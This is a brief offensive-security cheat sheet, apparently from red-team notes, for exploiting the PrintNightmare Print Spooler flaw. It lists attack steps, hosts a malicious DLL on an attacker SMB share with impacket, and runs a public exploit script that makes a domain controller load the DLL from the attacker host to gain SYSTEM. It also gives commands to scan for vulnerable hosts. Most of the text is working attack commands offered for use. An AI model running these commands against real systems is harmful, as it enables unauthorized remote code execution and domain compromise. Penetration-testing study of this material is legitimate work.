# 03.28 PrintNightmare

> CVE-2021-1675 / CVE-2021-34527 — RCE via Print Spooler service, remote or local.

## Overview

PrintNightmare exploits the Print Spooler service. Remote variant: trigger SpoolSample / PrinterBug to coerce auth; combined with NTLM relay, useful as a primitive. Local variant: load arbitrary DLL via Print Spooler API with any user creds — escalates to SYSTEM. Many DCs ran Print Spooler service in 2021; the CVE is patched but unpatched systems persist. Critical CRTP-era exploit.

## Steps

- **Step 1** - Verify target is unpatched (Spooler still vulnerable).
- **Step 2** - Local: drop malicious DLL to attacker-accessible share.
- **Step 3** - Trigger Print Spooler load.
- **Step 4** - SYSTEM-context payload runs.

```powershell

Invoke-Nightmare
```

### Remote exploit (need SMB write rights to a share)

```bash
# 1. Set up SMB share with payload DLL
sudo impacket-smbserver share /tmp/share -smb2support
# Copy a malicious DLL to /tmp/share/
# 2. Trigger
python3 CVE-2021-1675.py <DOMAIN>/<USER>:<PASS>@<TARGET-DC> '\\\\<ATTACKER>\\share\\addCube.dll'
```

### Check vulnerable hosts

```bash
nxc smb <TARGET-LIST> -u <USER> -p <PASS> -M printnightmare
```
